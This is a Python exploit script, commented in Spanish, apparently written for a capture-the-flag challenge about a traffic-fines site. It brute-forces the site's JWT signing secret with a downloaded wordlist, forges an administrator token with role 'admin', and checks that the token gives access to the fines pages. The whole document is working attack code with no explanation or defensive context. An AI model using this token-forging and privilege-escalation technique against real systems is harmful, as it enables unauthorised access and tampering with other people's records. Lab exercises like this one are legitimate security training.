#!/usr/bin/env python3
import requests, base64, hmac, hashlib, json, time

# CONFIGURACIÓN
WEB_URL = "https://chl-3b00e175-38f0-4e71-96fe-63e448fc05d5-consulta-multas.softwareseguro.com.ar/"
IGNACIO_EMAIL = "ignacio_123@yopmail.com"
ADMIN_EMAIL = "administrador_multas@yopmail.com"

# 1. Obtener el JWT actual
session = requests.Session()
resp = session.get(f"{WEB_URL}/perfil/", timeout=10, verify=False)
# Extraer cookie auth del response
auth_cookie = None
for cookie in resp.cookies:
    if cookie.name == 'auth':
        auth_cookie = cookie.value

if not auth_cookie:
    print("[-] No se encontró cookie auth")
    exit(1)

# Decodificar JWT actual
def b64url_decode(s):
    s += '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s).decode('utf-8')

parts = auth_cookie.split('.')
header_b64, payload_b64, sig_b64 = parts[0], parts[1], parts[2]
header = json.loads(b64url_decode(header_b64))
payload_original = json.loads(b64url_decode(payload_b64))

print(f"[+] JWT actual - role: {payload_original.get('role')}")
print(f"[+] Algoritmo: {header.get('alg')}")

# 2. Force bruta del secreto (mismo pattern que antes)
wordlist_url = "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list"
wordlist_resp = requests.get(wordlist_url, timeout=10, verify=False)
secrets = wordlist_resp.text.split('\n')

def verify_secret(secret, header_b64, payload_b64, expected_sig):
    signing_input = f"{header_b64}.{payload_b64}"
    calculated = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    ).decode().rstrip('=')
    return calculated == expected_sig

print("[+] Iniciando fuerza bruta del secreto...")
found_secret = None
for i, secret in enumerate(secrets, 1):
    secret = secret.strip()
    if not secret: continue
    if verify_secret(secret, header_b64, payload_b64, sig_b64):
        found_secret = secret
        print(f"[+] Secreto encontrado en línea {i}: '{secret}'")
        break
    if i % 100 == 0:
        print(f"[+] Probado {i} secretos...")

if not found_secret:
    print("[-] No se encontró secreto en la wordlist")
    exit(1)

# 3. Generar JWT ADMIN con el secreto encontrado
admin_payload = {
    "sub": payload_original['sub'],
    "username": ADMIN_EMAIL,  # Email del administrador
    "email": ADMIN_EMAIL,
    "iat": payload_original['iat'],
    "exp": payload_original['exp'],
    "role": "admin"  # <--- CAMBIO CRÍTICO
}

new_header = {"alg": header.get('alg', 'HS256'), "typ": "JWT"}
new_header_str = json.dumps(new_header, separators=(',', ':'))
new_header_b64 = base64.urlsafe_b64encode(new_header_str.encode()).decode().rstrip('=')

payload_str = json.dumps(admin_payload, separators=(',', ':'))
payload_b64_new = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')

signing_input = f"{new_header_b64}.{payload_b64_new}"
signature = hmac.new(found_secret.encode(), signing_input.encode(), hashlib.sha256).digest()
new_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')

admin_token = f"{new_header_b64}.{payload_b64_new}.{new_signature}"

print(f"[+] Token admin generado: {admin_token}")

# 4. Probar el token admin
print("\n[1] Probando token en /perfil/...")
resp1 = session.get(f"{WEB_URL}/perfil/", cookies={"auth": admin_token}, timeout=10, verify=False)
print(f"    Status: {resp1.status_code}")

print("[2] Probando token en /multas/...")
resp2 = session.get(f"{WEB_URL}/multas/", cookies={"auth": admin_token}, timeout=10, verify=False)
print(f"    Status: {resp2.status_code}")
print(f"    Body preview: {resp2.text[:300]}")

# Verificar éxito
if resp2.status_code == 200 and "multa" in resp2.text.lower():
    print("\n[+] ¡ÉXITO! El token admin fue aceptado")
    print("[+] Ahora debería ver las multas y poder 'pagarlas'")
else:
    print("\n[-] El token fue rechazado o no hay multas visibles")
